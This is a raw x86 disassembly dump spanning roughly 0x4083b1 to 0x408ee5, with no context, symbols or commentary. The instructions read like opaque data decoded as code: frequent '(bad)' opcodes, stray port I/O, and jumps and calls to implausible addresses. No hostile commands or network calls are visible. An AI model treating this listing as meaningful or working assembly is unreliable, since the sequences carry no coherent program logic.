  4083b1:	xor    DWORD PTR [esi+edi*8],eax
  4083b4:	push   0xbaf6ff93
  4083b9:	xor    DWORD PTR [ebp-0x1f],esi
  4083bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083bd:	jmp    0xde0b6a90
  4083c2:	lods   al,BYTE PTR ds:[esi]
  4083c3:	inc    ecx
  4083c4:	ret    
  4083c5:	xor    edi,edi
  4083c7:	in     eax,dx
  4083c8:	inc    edi
  4083c9:	xor    bh,bh
  4083cb:	push   esp
  4083cc:	mov    ds:0xcab6a639,al
  4083d1:	xor    edi,edi
  4083d3:	je     0x40843a
  4083d5:	xor    bh,bh
  4083d7:	mov    dh,0xba
  4083d9:	out    0x53,eax
  4083db:	scas   al,BYTE PTR es:[edi]
  4083dc:	mov    dl,0x31
  4083de:	call   FWORD PTR [edx+edi*2]
  4083e1:	cmp    DWORD PTR [edi-0x14ce3d52],esp
  4083e7:	in     eax,0x47
  4083e9:	pop    ebx
  4083ea:	push   0xffffffe9
  4083ec:	mov    dl,0xa7
  4083ee:	or     BYTE PTR [eax],al
  4083f0:	scas   eax,DWORD PTR es:[edi]
  4083f1:	mov    ds:0xded0ffcf,eax
  4083f6:	mov    ah,0x54
  4083f8:	rcr    dh,1
  4083fa:	(bad)  
  4083fb:	call   0x3f6f9f
  408400:	mov    al,ds:0x90ff5c89
  408405:	(bad)  
  408407:	mov    ebp,0x2bfedf65
	...
  408434:	add    BYTE PTR [eax],al
  408436:	ins    BYTE PTR es:[edi],dx
  408437:	push   esp
  408438:	pop    ds
  408439:	push   eax
  40843a:	out    0x5c,al
  40843c:	call   0x9d157c
  408441:	mov    DWORD PTR [edx+0x50fffe10],ebx
  408447:	fstp   TBYTE PTR [esp+ebp*1+0xfedf20]
  40844e:	retf   
  40844f:	or     esp,DWORD PTR ds:[bx+0x9d]
  408455:	dec    DWORD PTR [edx+0x40fffe10]
  40845b:	aam    0xbb
  40845d:	mov    ebp,0xc00b5ce7
  408462:	dec    ebx
  408463:	xor    cl,BYTE PTR [ebp+edx*4-0x12079]
  40846a:	jne    0x408450
  40846c:	iret   
  40846d:	inc    ebx
  40846e:	lods   al,BYTE PTR ds:[esi]
  40846f:	add    DWORD PTR [ebp+0xc],esi
  408472:	and    bl,dl
  408474:	das    
  408475:	push   DWORD PTR [eax-0x1c]
  408478:	dec    edi
  408479:	call   0x4126f5
  40847e:	in     eax,dx
  40847f:	cmp    cl,BYTE PTR [ebp+eax*4-0x11a79]
  408486:	daa    
  408487:	in     al,0x74
  408489:	or     bh,cl
  40848b:	jno    0x40845c
  40848d:	call   eax
  40848f:	in     al,0x74
  408491:	cld    
  408492:	ds leave 
  408494:	adc    BYTE PTR [eax],cl
  408496:	push   esi
  408497:	call   0x418456
	...
  4084c4:	pop    ecx
  4084c5:	jns    0x4084f6
  4084c7:	leave  
  4084c8:	jl     0x408500
  4084ca:	add    edx,DWORD PTR [ebp-0x4b]
  4084cd:	(bad)  
  4084ce:	test   ah,al
  4084d0:	push   esi
  4084d1:	test   eax,0xfecbff8b
  4084d6:	xchg   BYTE PTR [eax+0x31],dl
  4084d9:	pop    es
  4084da:	idiv   esi
  4084dc:	jae    0x4084ba
  4084de:	cmp    eax,DWORD PTR [ecx+0x3e]
  4084e1:	call   0xbffe:0x423ebe1d
  4084e8:	inc    ecx
  4084e9:	mov    bh,0xa3
  4084eb:	add    BYTE PTR [esi],bh
  4084ed:	inc    edx
  4084ee:	ret    0x645
  4084f1:	inc    edx
  4084f2:	add    eax,DWORD PTR [eax]
  4084f4:	add    DWORD PTR ds:[ecx-0xc],0x338f1
  4084fc:	push   esp
  4084fd:	inc    edx
  4084fe:	sbb    eax,0x98b6b300
  408503:	neg    ecx
  408505:	pop    eax
  408506:	xor    al,0x6a
  408508:	ds mov edi,0xb76ef441
  40850e:	xor    esp,0x508a40c9
  408514:	mov    ecx,0x2bff8c8e
  408519:	push   cs
  40851a:	fwait
  40851b:	push   esp
  40851c:	call   0x7e4b8862
  408521:	test   DWORD PTR [ecx],eax
  408523:	jmp    0x43c70b
	...
  408550:	add    BYTE PTR [eax],al
  408552:	mov    ebp,0x89f797ae
  408557:	call   0xc570f95f
  40855c:	dec    eax
  40855d:	in     al,dx
  40855e:	jno    0x4085ba
  408560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408561:	mov    bh,BYTE PTR [ecx]
  408563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408564:	in     al,0x8a
  408566:	add    esi,DWORD PTR [ebx]
  408568:	adc    BYTE PTR [ecx-0x2a],0x71
  40856c:	cmp    BYTE PTR [ebp+0x3e],al
  40856f:	fisubr WORD PTR [ebx-0x71]
  408572:	dec    ecx
  408573:	das    
  408574:	jle    0x4085a9
  408576:	push   esi
  408577:	cdq    
  408578:	aaa    
  408579:	add    edi,DWORD PTR [esi]
  40857b:	fs test eax,0x6be0af0f
  408581:	fwait
  408582:	sub    DWORD PTR [edi],ebp
  408584:	pop    esi
  408585:	xor    edi,DWORD PTR [ebx+0x21925cd8]
  40858b:	das    
  40858c:	mov    ecx,0x465f938a
  408591:	shl    bh,1
  408593:	mov    ds:0x191603a8,eax
  408598:	sbb    eax,0x2963018a
  40859d:	jg     0xe9d3f187
  4085a3:	cs push ds
  4085a5:	sbb    edi,DWORD PTR [edi]
  4085a7:	pop    ebx
  4085a8:	push   es
  4085a9:	dec    ecx
  4085aa:	loope  0x408554
  4085ac:	loope  0x408549
  4085ae:	sbb    DWORD PTR ds:0xf0bd8a06,0x920c
	...
  4085e0:	leave  
  4085e1:	cs call 0xea01b7f7
  4085e7:	mov    dh,BYTE PTR [ebx]
  4085e9:	arpl   cx,dx
  4085eb:	rol    BYTE PTR [ebx+0x349dde2e],1
  4085f1:	shr    eax,0x88
  4085f4:	sub    esp,DWORD PTR [ebx-0x3f]
  4085f7:	fmul   QWORD PTR [ebx-0x347639d2]
  4085fd:	inc    ebx
  4085fe:	mov    dh,0x89
  408600:	mov    DWORD PTR [esi],ebp
  408602:	add    BYTE PTR [edx+ebp*4+0x26],bh
  408606:	jmp    FWORD PTR [esi-0x6ef75739]
  40860c:	xor    BYTE PTR ds:0xe8b79eff,bl
  408612:	out    dx,eax
  408613:	sahf   
  408614:	mov    bh,0x2e
  408616:	call   0xff6f134c
  40861b:	xchg   BYTE PTR [ecx],dl
  40861d:	xor    ebp,ecx
  40861f:	shl    DWORD PTR [esi+0x3176ff2e],1
  408625:	das    
  408626:	call   0x9c0720
  40862b:	xor    al,bh
  40862d:	bound  eax,QWORD PTR [eax]
  40862f:	mov    ah,0xaa
  408631:	aas    
  408632:	sub    DWORD PTR ds:0x4eff25de,0x99fc9891
  40863c:	(bad)  
  40863d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40863e:	or     al,0x3e
  408640:	stc    
  408641:	add    ecx,DWORD PTR [eax-0x58]
	...
  40866c:	add    BYTE PTR [eax],al
  40866e:	cmp    eax,0x426c5b43
  408673:	pop    ebx
  408674:	or     ebp,DWORD PTR [ecx]
  408676:	not    esi
  408678:	push   edx
  408679:	call   0xad07e1bb
  40867e:	mov    ch,0x5a
  408680:	add    cl,ch
  408682:	cmp    eax,0xc6fd4516
  408687:	push   ebp
  408688:	add    cl,ch
  40868a:	sub    ebx,DWORD PTR [ebx+0x6a]
  40868d:	jmp    0xe9aae1b5
  408692:	xor    BYTE PTR [eax-0x27d6c60c],bl
  408698:	repz (bad) 
  40869a:	mov    dh,0x2d
  40869c:	push   eax
  40869d:	(bad)  
  40869e:	xor    BYTE PTR [ebx],dh
  4086a0:	call   DWORD PTR [esi+eax*8+0x42]
  4086a4:	sub    eax,0x59ba00
  4086a9:	or     edx,edi
  4086ab:	pop    ebp
  4086ac:	add    eax,0x5861e9
  4086b1:	add    bh,bh
  4086b3:	fadd   DWORD PTR [edi+0x41]
  4086b6:	addr16 loop 0x40872d
  4086b9:	or     al,0xcf
  4086bb:	arpl   sp,dx
  4086bd:	dec    eax
  4086bf:	imul   ecx,DWORD PTR [ebx-0xb530530],0x4fe2b8f7
  4086c9:	push   edx
  4086ca:	scas   eax,DWORD PTR es:[edi]
  4086cb:	push   ebx
  4086cc:	aam    0xff
  4086ce:	enter  0x85b0,0xf0
	...
  4086fa:	add    BYTE PTR [eax],al
  4086fc:	mov    al,0xe3
  4086fe:	(bad)  
  4086ff:	call   0x3f6f67
  408704:	or     eax,0xe6226859
  408709:	cdq    
  40870a:	add    bh,bh
  40870c:	mov    dl,0xc8
  40870e:	idiv   bh
  408710:	js     0x4086f5
  408712:	xor    al,0xaa
  408714:	iret   
  408715:	cdq    
  408716:	add    al,ch
  408718:	push   ebx
  408719:	out    0xfe,eax
  40871b:	call   FWORD PTR [esi-0x53]
  40871e:	in     al,0xf7
  408720:	sbb    bl,ah
  408722:	imul   eax,DWORD PTR [eax],0x41500fcf
  408728:	xlat   BYTE PTR ds:[ebx]
  408729:	jecxz  0x4086df
  40872b:	lock xor bl,ah
  40872e:	(bad)  
  40872f:	call   DWORD PTR [edx-0x28beb772]
  408735:	shl    BYTE PTR [ebp-0x772b372d],1
  40873b:	test   DWORD PTR [ebx+0xdfffedc],edi
  408741:	push   edi
  408742:	push   0x966634
  408747:	(bad)  
  408748:	ds iret 
  40874a:	xchg   ebx,eax
  40874b:	neg    DWORD PTR [ecx-0x1bca78e3]
  408751:	push   0x45
  408753:	add    BYTE PTR [esi-0x7e004c56],dl
  408759:	mov    ebx,0xfd71e881
  40875e:	xchg   BYTE PTR [ebx+0x0],al
	...
  408788:	add    BYTE PTR [eax],al
  40878a:	mov    bl,0xde
  40878c:	mov    ?,edi
  40878e:	imul   eax,DWORD PTR [edx+0xf],0x9887bd49
  408795:	neg    DWORD PTR [ecx-0x23]
  408798:	add    esi,DWORD PTR [esi+edi*8-0x40]
  40879c:	dec    ecx
  40879d:	call   0xc834f3
  4087a2:	retf   0x1aec
  4087a5:	add    BYTE PTR [esi],bh
  4087a7:	lods   eax,DWORD PTR ds:[esi]
  4087a8:	inc    esi
  4087a9:	jmp    FWORD PTR [ebx-0x50c64d6]
  4087af:	mov    WORD PTR [edi-0x706a1401],es
  4087b5:	call   FWORD PTR [ecx]
  4087b7:	popf   
  4087b8:	adc    DWORD PTR [eax],ecx
  4087ba:	es std 
  4087bc:	mov    bh,0xff
  4087be:	or     DWORD PTR [ebp+0x51],ebp
  4087c1:	call   0xffc7eccf
  4087c6:	jae    0x408802
  4087c8:	fwait
  4087c9:	cmp    DWORD PTR [ebx],eax
  4087cb:	jne    0x408754
  4087cd:	push   DWORD PTR [ebx-0x1e0070ab]
  4087d3:	inc    esp
  4087d4:	adc    DWORD PTR [eax],ecx
  4087d6:	out    0x18,al
  4087d8:	mov    eax,0x5154d1ff
  4087dd:	in     al,0xd1
  4087df:	sub    al,0x86
  4087e1:	call   0xffc7da19
  4087e6:	mov    ecx,0xb1f79866
  4087eb:	pop    edx
  4087ec:	out    0x9b,al
	...
  408816:	add    BYTE PTR [eax],al
  408818:	cmp    al,0xb
  40881a:	fiadd  WORD PTR [esi-0x713f1a5f]
  408820:	cdq    
  408821:	sub    eax,ecx
  408823:	mov    es,WORD PTR [ecx-0x2c7939d5]
  408829:	sub    dh,BYTE PTR [esi+0x3c2b8186]
  40882f:	cld    
  408830:	popa   
  408831:	cmc    
  408832:	scas   al,BYTE PTR es:[edi]
  408833:	xchg   BYTE PTR [ecx+0x2b],dh
  408836:	pop    esp
  408837:	xchg   ebx,eax
  408838:	jno    0x408865
  40883a:	sahf   
  40883b:	fwait
  40883c:	sbb    BYTE PTR [ebx],0x96
  40883f:	xchg   BYTE PTR [ecx-0x6b],bl
  408842:	xchg   ecx,eax
  408843:	pushf  
  408844:	xchg   edx,eax
  408845:	sub    al,0x86
  408847:	xchg   BYTE PTR [ecx-0x5b],cl
  40884a:	jge    0x4087e7
  40884c:	inc    esp
  40884d:	out    dx,eax
  40884e:	call   0xe15e8f56
  408853:	add    ecx,DWORD PTR [ebx+0x28254d6]
  408859:	sub    bl,dl
  40885b:	add    edx,DWORD PTR [esp+ebx*2+0x33461056]
  408862:	pop    ecx
  408863:	mov    bh,0x11
  408865:	sub    esi,DWORD PTR [eax+0x40]
  408868:	or     dh,BYTE PTR [edx+eax*1+0x365b7f34]
  40886f:	adc    BYTE PTR [esi+0x33],al
  408872:	lds    eax,FWORD PTR [ebp+0x29912af1]
  408878:	mov    ds,WORD PTR [ecx+ebp*8+0x86]
	...
  4088a3:	add    BYTE PTR [eax],al
  4088a5:	add    BYTE PTR [ebx+0x53],ch
  4088a8:	add    DWORD PTR [esi],ebp
  4088aa:	fsubr  DWORD PTR [edx]
  4088ac:	push   cs
  4088ad:	sbb    edx,DWORD PTR [ebx+ecx*4-0x58]
  4088b1:	add    ecx,ecx
  4088b3:	mov    al,0xf1
  4088b5:	fwait
  4088b6:	je     0x4088e1
  4088b8:	add    dh,dh
  4088ba:	ret    
  4088bb:	mov    bl,0xa1
  4088bd:	cdq    
  4088be:	cli    
  4088bf:	pop    edx
  4088c0:	call   FWORD PTR [edx+ebp*4+0x42]
  4088c4:	das    
  4088c5:	fdivr  QWORD PTR [ebx+0x52a0682a]
  4088cb:	pushf  
  4088cc:	add    dh,cl
  4088ce:	inc    ecx
  4088cf:	push   ebx
  4088d0:	call   0xff6b49e0
  4088d5:	push   ecx
  4088d6:	lods   al,BYTE PTR ds:[esi]
  4088d7:	mov    eax,DWORD PTR [ecx-0x17]
  4088da:	ret    0x8b0
  4088dd:	shl    DWORD PTR [ecx+0x27],0xff
  4088e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088e2:	ret    
  4088e3:	mov    al,0xfc
  4088e5:	sahf   
  4088e6:	xor    DWORD PTR [ebx-0x18],edx
  4088e9:	mov    bl,0x96
  4088eb:	sub    bh,bh
  4088ed:	mov    al,ds:0x1c005f7c
  4088f2:	(bad)  
  4088f3:	ss push 0xbe3a3de9
  4088f9:	jbe    0x408944
  4088fb:	push   edi
  4088fc:	push   esp
  4088fe:	xor    eax,0xc35c5242
  408903:	sub    ecx,ecx
  408905:	sub    esp,DWORD PTR [edx]
  408907:	sub    dl,BYTE PTR [edx+eiz*2+0x0]
	...
  408933:	add    BYTE PTR [esi+0x3ddd7cdd],dh
  408939:	pop    edx
  40893a:	test   BYTE PTR [ebx],cl
  40893c:	cmp    eax,0x313e005b
  408941:	push   edi
  408942:	call   0xff6a30fc
  408947:	loop   0x408946
  408949:	scas   eax,DWORD PTR es:[edi]
  40894a:	adc    BYTE PTR [ecx-0x16be6c95],dl
  408950:	mov    edx,0xd0010caf
  408955:	or     al,0xff
  408957:	push   cs
  408958:	push   ebp
  408959:	mov    al,ds:0x5dad000c
  40895e:	push   0x9ca65e
  408963:	push   0x416cbe
  408968:	mov    al,ds:0x5648a918
  40896d:	pop    edi
  40896e:	call   0xff1f6e8c
  408973:	or     esp,edi
  408975:	pop    ecx
  408976:	push   ds
  408977:	push   eax
  408978:	push   edi
  408979:	loopne 0x4089ef
  40897b:	or     al,0x6f
  40897d:	stos   DWORD PTR es:[edi],eax
  40897e:	sar    bh,cl
  408980:	shr    BYTE PTR [ebp+0x50],0xff
  408984:	cmp    ah,BYTE PTR [edi]
  408986:	out    0x91,eax
  408988:	mov    al,ds:0xbbe8fede
  40898d:	out    dx,eax
  40898e:	(bad)  
  40898f:	dec    edi
  408991:	dec    ch
  408993:	push   DWORD PTR [eax+0x680043]
	...
  4089c1:	add    BYTE PTR [ecx],ah
  4089c3:	outs   dx,BYTE PTR ds:[esi]
  4089c4:	inc    ecx
  4089c5:	add    BYTE PTR [edi],ch
  4089c7:	inc    esi
  4089c8:	push   ecx
  4089c9:	inc    ecx
  4089ca:	push   edi
  4089cb:	inc    ebp
  4089cc:	add    al,BYTE PTR [eax]
  4089ce:	daa    
  4089cf:	fucom  st(7)
  4089d1:	loope  0x4089a9
  4089d3:	(bad)  
  4089d5:	or     edx,DWORD PTR [edi+0x58]
  4089d8:	push   ds
  4089d9:	push   eax
  4089da:	out    0xdf,eax
  4089dc:	je     0x4089ea
  4089de:	jg     0x408a52
  4089e0:	sar    bh,cl
  4089e2:	sub    BYTE PTR [eax+edx*2-0x1],0xca
  4089e7:	and    al,0xe7
  4089e9:	pop    ecx
  4089ea:	inc    eax
  4089eb:	(bad)  
  4089ed:	call   0x3f78b5
  4089f2:	jg     0x40897b
  4089f4:	into   
  4089f5:	jmp    DWORD PTR [eax]
  4089f7:	inc    edx
  4089f8:	add    BYTE PTR [eax-0x5f],ch
  4089fb:	ins    DWORD PTR es:[edi],dx
  4089fc:	inc    ecx
  4089fd:	add    BYTE PTR [esi],bh
  4089ff:	fidiv  DWORD PTR [esi+0x51]
  408a02:	jg     0x408a36
  408a04:	test   BYTE PTR ds:0x41ea94,dh
  408a0a:	(bad)  
  408a0b:	mov    dh,BYTE PTR [edx-0x3cc24601]
  408a11:	je     0x408a63
  408a13:	ret    0xff32
  408a16:	xor    ebp,DWORD PTR [esi]
  408a18:	imul   esp,DWORD PTR [ecx],0xffffff8c
  408a1b:	or     DWORD PTR [ebx-0x6ef11b0],eax
  408a21:	pop    es
  408a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a23:	push   edx
  408a24:	cmp    edi,0x0
	...
  408a4f:	add    BYTE PTR [ecx-0x7e3208f6],cl
  408a55:	jmp    0xf1c8f8c5
  408a5a:	sub    BYTE PTR [edx+0x3e],0x9a
  408a5e:	loop   0x408ab0
  408a60:	push   DWORD PTR [ecx]
  408a62:	jmp    0x4089ef
  408a64:	(bad)  
  408a66:	add    al,0x68
  408a68:	cmp    al,0x32
  408a6a:	add    eax,DWORD PTR [eax-0xaabd9a]
  408a70:	dec    ecx
  408a71:	sub    eax,0x42207443
  408a76:	aam    0xfe
  408a78:	mov    bl,0x3e
  408a7a:	imul   ebp,ecx,0xf
  408a7d:	mov    ecx,0xc18e5083
  408a82:	stc    
  408a83:	pop    es
  408a84:	push   ss
  408a85:	mov    al,BYTE PTR [edx+0x3f9a19ff]
  408a8b:	into   
  408a8c:	adc    DWORD PTR [ecx-0x5f07c994],ebx
  408a92:	sub    DWORD PTR [eax+0x40],0xffffffc3
  408a96:	ret    
  408a97:	(bad)  
  408a98:	clc    
  408a99:	out    0xe,al
  408a9b:	call   0xffc3cda6
  408aa0:	mov    ds,WORD PTR [ebx-0x47]
  408aa3:	sub    BYTE PTR [ebx+0x53],0x11
  408aa7:	dec    ebx
  408aa8:	fsub   DWORD PTR [edi]
  408aaa:	push   ss
  408aab:	ins    BYTE PTR es:[edi],dx
  408aac:	xor    al,0x19
  408aae:	push   cs
  408aaf:	or     ecx,0xffffffad
  408ab2:	cmc    
  408ab3:	imul   eax,DWORD PTR [eax],0x0
	...
  408ade:	sub    al,0x19
  408ae0:	inc    BYTE PTR [edx+0x3e11c87]
  408ae6:	or     edx,esp
  408ae8:	cld    
  408ae9:	xchg   BYTE PTR [edx+0x1404532e],al
  408aef:	pop    ebp
  408af0:	fdivp  st(0),st
  408af2:	inc    ecx
  408af3:	xor    ebx,DWORD PTR ds:0x6027914f
  408af9:	enter  0xb285,0xec
  408afd:	add    al,0x3e
  408aff:	pop    ebx
  408b00:	ror    DWORD PTR [ecx],1
  408b02:	mov    BYTE PTR [edi],ah
  408b04:	mov    dh,0x8c
  408b06:	sti    
  408b07:	and    al,BYTE PTR [ecx+0x8]
  408b0a:	aas    
  408b0b:	pop    ebx
  408b0c:	jmp    0x91637693
  408b11:	test   BYTE PTR [edi+0x7e0ee95a],dl
  408b17:	scas   al,BYTE PTR es:[edi]
  408b18:	cmc    
  408b19:	inc    eax
  408b1a:	inc    edx
  408b1b:	pop    edx
  408b1c:	jmp    0x7e965424
  408b21:	clc    
  408b22:	xor    DWORD PTR [edi],esp
  408b24:	cld    
  408b25:	or     esp,DWORD PTR [esi]
  408b27:	aam    0x6e
  408b29:	sub    BYTE PTR [ecx],0x33
  408b2c:	icebp  
  408b2d:	sub    BYTE PTR [ebx+0xbc25123],0x27
  408b34:	push   esi
  408b35:	in     eax,dx
  408b36:	pop    ecx
  408b37:	xor    edi,ecx
  408b39:	push   ebp
  408b3a:	or     DWORD PTR [edi],esp
  408b3c:	cdq    
  408b3d:	or     BYTE PTR [ebx+0xf15153],0x0
	...
  408b6c:	sti    
  408b6d:	add    BYTE PTR es:[esi],dh
  408b70:	jecxz  0x408bb6
  408b72:	call   0xff671f60
  408b77:	bnd jge 0x408b29
  408b7a:	adc    al,0x91
  408b7c:	or     ecx,DWORD PTR [ecx+eax*2-0x73c11217]
  408b83:	cmp    BYTE PTR [esi+eiz*1+0x5ec60650],bh
  408b8a:	call   0xff674b3d
  408b8f:	sbb    DWORD PTR [eax+0x33],0xffffffe1
  408b93:	sbb    BYTE PTR [esi+eiz*1+0x4aa6a90b],bh
  408b9a:	push   0x9b6d33
  408b9f:	cmp    DWORD PTR [edx],esp
  408ba1:	mov    eax,0x8bbfced1
  408ba6:	(bad)  
  408ba7:	cmp    al,0x32
  408ba9:	xor    esi,DWORD PTR [eax]
  408bab:	mov    edi,0xd56a26bf
  408bb0:	in     eax,0x18
  408bb2:	shr    DWORD PTR [esi+0x1dc052bf],1
  408bb8:	inc    esi
  408bb9:	mov    bl,0x4a
  408bbb:	cmp    BYTE PTR [ebp+0x26],bh
  408bbe:	dec    edi
  408bbf:	sub    DWORD PTR [ebx+ecx*1-0x1],0x7525728e
  408bc7:	icebp  
  408bc8:	aad    0x4b
  408bca:	(bad)  
  408bcb:	jle    0x408b8c
  408bcd:	mov    al,0x0
  408bcf:	add    DWORD PTR [eax],eax
	...
  408bf9:	add    BYTE PTR [ebx],cl
  408bfb:	mov    eax,DWORD PTR [ecx-0x17]
  408bfe:	adc    eax,0x3da851b3
  408c03:	es xor eax,0x9b0a93
  408c09:	inc    ecx
  408c0a:	jmp    0x408c21
  408c0c:	dec    DWORD PTR [esi-0xe]
  408c0f:	and    al,0x75
  408c11:	add    BYTE PTR [edi],cl
  408c13:	mov    dl,0xf1
  408c15:	std    
  408c16:	cmp    ah,bl
  408c18:	imul   eax,DWORD PTR [eax],0x41503bff
  408c1e:	xlat   BYTE PTR ds:[ebx]
  408c1f:	xor    DWORD PTR [eax+0x51],ebp
  408c22:	xchg   esi,eax
  408c23:	pop    ecx
  408c24:	push   DWORD PTR ds:0x40176d
  408c2a:	aas    
  408c2b:	jo     0x408bfd
  408c2d:	(bad)  
  408c2e:	cmp    BYTE PTR [eax-0x40],bl
  408c31:	je     0x408c14
  408c33:	rol    BYTE PTR [esp+esi*8-0x48],1
  408c37:	sub    al,0xf3
  408c39:	push   DWORD PTR [edx]
  408c3b:	push   edx
  408c3c:	call   0xff1b26f2
  408c41:	inc    DWORD PTR [edx]
  408c43:	mov    ds:0xdaea01e8,eax
  408c48:	(bad)  
  408c49:	push   0xffffffa7
  408c4b:	xor    DWORD PTR [edx+0x51],edx
  408c4e:	push   esi
  408c4f:	pop    edi
  408c50:	push   0xff1a268c
  408c55:	(bad)  
  408c56:	jb     0x408c4f
  408c58:	inc    edi
  408c59:	inc    ecx
  408c5a:	addr16 mov cl,0x2
  408c5d:	rol    BYTE PTR [eax],1
	...
  408c87:	add    BYTE PTR [eax+0x42ff4fda],bl
  408c8d:	push   edi
  408c8e:	call   0xff1b4733
  408c93:	push   0x67
  408c95:	xor    DWORD PTR [ebp+0x51],ebx
  408c98:	push   ss
  408c99:	pop    edi
  408c9a:	push   0xff1a268c
  408c9f:	(bad)  
  408ca0:	repnz test BYTE PTR [edi+0x41],0x27
  408ca5:	mov    cl,0xe2
  408ca7:	iret   
  408ca8:	cwde   
  408ca9:	fisttp DWORD PTR [edx]
  408cab:	rol    BYTE PTR [ebx],0x43
  408cae:	mov    DWORD PTR [ebp+0x73],eax
  408cb1:	(bad)  [esp+esi*8+0x3e]
  408cb5:	(bad)  
  408cb6:	test   BYTE PTR [edi],0x16
  408cb9:	adc    edi,DWORD PTR [esi-0x1]
  408cbc:	add    DWORD PTR [esi-0x5d190c0a],ebx
  408cc2:	dec    edi
  408cc3:	push   ecx
  408cc5:	sbb    BYTE PTR [ebx],al
  408cc7:	push   0xffc1c38d
  408ccc:	pop    ecx
  408ccd:	retf   
  408cce:	rol    DWORD PTR [eax+0x3e],1
  408cd1:	retf   0x4
  408cd4:	ds mov dl,0x6b
  408cd7:	mov    dl,0xf9
  408cd9:	push   ebp
  408cda:	adc    BYTE PTR [eax-0x3f],0xa7
  408cde:	or     ebp,eax
  408ce0:	push   cs
  408ce1:	daa    
  408ce2:	jg     0x408ce3
  408ce4:	and    al,0x32
  408ce6:	jmp    0x408d45
  408ce8:	psllq  mm0,QWORD PTR [edx]
  408ceb:	push   0x0
	...
  408d14:	add    BYTE PTR [eax],al
  408d16:	pop    ss
  408d17:	arpl   bp,ax
  408d19:	jmp    DWORD PTR [ecx]
  408d1b:	xor    BYTE PTR [ebx],al
  408d1d:	add    BYTE PTR [esi-0x76306ce6],bh
  408d23:	adc    eax,0x40ac00b
  408d28:	mov    WORD PTR [ebp+0x72],es
  408d2b:	in     eax,0xf8
  408d2d:	repz jno 0x408d97
  408d30:	or     al,0xe8
  408d32:	dec    edi
  408d33:	idiv   DWORD PTR [esi-0x1]
  408d36:	popa   
  408d37:	inc    edi
  408d38:	js     0x408d22
  408d3a:	fcomip st,st(5)
  408d3c:	jle    0x408d3d
  408d3e:	in     al,0x31
  408d40:	jmp    0x408d94
  408d42:	out    dx,eax
  408d43:	jb     0x408d49
  408d45:	push   0xffc543b2
  408d4a:	mov    eax,ds:0xbe000330
  408d4f:	(bad)  
  408d51:	into   
  408d52:	sub    DWORD PTR [ebp+0x5babfed4],esi
  408d58:	icebp  
  408d59:	imul   edi,DWORD PTR [edi],0x26
  408d5c:	pop    esi
  408d5d:	jg     0x408d03
  408d5f:	pop    ebx
  408d60:	rcr    ebp,0x6e
  408d63:	call   0x3a8:0x89b5ebe9
  408d6a:	pop    cx
  408d6c:	jmp    0xad734b74
  408d71:	dec    esi
  408d72:	jmp    0x6a846f9a
  408d77:	dec    ebp
  408d78:	jo     0x408d43
	...
  408da2:	add    BYTE PTR [eax],al
  408da4:	int    0x23
  408da6:	xchg   esp,eax
  408da7:	ja     0x408d7a
  408da9:	lods   eax,DWORD PTR ds:[esi]
  408daa:	loope  0x408e17
  408dac:	cld    
  408dad:	es push cs
  408daf:	jg     0x408d72
  408db1:	lods   eax,DWORD PTR ds:[esi]
  408db2:	std    
  408db3:	imul   ecx,DWORD PTR [edi+edx*1-0x2],0x7e
  408db8:	mov    cl,0xad
  408dba:	cmc    
  408dbb:	jle    0x408df0
  408dbd:	push   ebx
  408dbe:	add    DWORD PTR [ecx+0x4ce62377],ecx
  408dc4:	jl     0x408e24
  408dc6:	jmp    0x417752a3
  408dcb:	add    al,0x3e
  408dcd:	xor    al,0x8f
  408dcf:	jle    0x408ddc
  408dd1:	push   edi
  408dd2:	xabort 0x41
  408dd5:	xor    edi,DWORD PTR [esp+esi*2+0x41a02371]
  408ddc:	ss pop ebx
  408dde:	adc    al,0x8b
  408de0:	push   edx
  408de1:	fldcw  WORD PTR [edi+esi*4+0x469e2358]
  408de8:	mov    ebx,0x497e96e2
  408ded:	pop    edx
  408dee:	jmp    0x2c10cbf6
  408df3:	adc    BYTE PTR [ebp+0x1b],al
  408df6:	cmc    
  408df7:	or     BYTE PTR [esi+0x26e90063],bh
  408dfd:	pop    eax
  408dfe:	jmp    0x9bc913
  408e03:	pushw  ss
  408e05:	push   edi
  408e06:	call   0x408f04
	...
  408e2f:	add    BYTE PTR [eax],al
  408e31:	add    BYTE PTR [eax+0x22],ch
  408e34:	jmp    edx
  408e36:	jge    0x408de0
  408e38:	xadd   DWORD PTR [edi-0x6e],esi
  408e3c:	inc    ecx
  408e3d:	jmp    0x514d36ba
  408e42:	add    edx,DWORD PTR [edx]
  408e44:	push   DWORD PTR [esi]
  408e46:	push   esp
  408e47:	push   eax
  408e48:	push   0x9bf01e
  408e4d:	es (bad) 
  408e4f:	push   esi
  408e50:	call   0xff630f33
  408e55:	pusha  
  408e56:	mov    dh,0xe3
  408e58:	std    
  408e59:	push   cs
  408e5a:	inc    eax
  408e5b:	mov    bl,0x3e
  408e5d:	call   0x64cde99f
  408e62:	jmp    DWORD PTR [eax]
  408e64:	push   esi
  408e66:	mov    WORD PTR [edx],?
  408e68:	mov    bh,0x22
  408e6a:	and    BYTE PTR [edx],ah
  408e6c:	lea    ebp,[esp+edi*8+0x20]
  408e70:	(bad)  
  408e71:	fisubr WORD PTR [edx+0x21]
  408e74:	mov    ch,0x91
  408e76:	or     BYTE PTR [edx],ah
  408e78:	inc    ecx
  408e7a:	adc    eax,0xc4e8ffe9
  408e7f:	fdivr  DWORD PTR [ebx+0x4021f3bf]
  408e85:	out    0xc1,al
  408e87:	es add cl,ch
  408e8a:	cmp    eax,0xd8ab94d0
  408e8f:	and    edi,edi
  408e91:	xchg   esi,eax
  408e92:	cmp    al,0x4b
  408e94:	add    cl,ch
	...
  408ebe:	add    BYTE PTR [eax],al
  408ec0:	cmp    eax,0x7c5c65a7
  408ec5:	jbe    0x408f17
  408ec7:	add    BYTE PTR [edi-0x66],cl
  408eca:	dec    edi
  408ecb:	inc    ecx
  408ecc:	daa    
  408ecd:	mov    dh,0xc6
  408ecf:	mov    dh,0x17
  408ed1:	pop    esi
  408ed2:	or     eax,eax
  408ed4:	sub    bl,BYTE PTR [ecx-0x17]
  408ed7:	mov    cl,0x27
  408ed9:	pop    esi
  408eda:	add    BYTE PTR [ebp-0x16276],cl
  408ee0:	jo     0x408eb4
  408ee2:	inc    ecx
  408ee3:	sub    al,0xc7
  408ee5:	xor    eax,0x5da64fc6
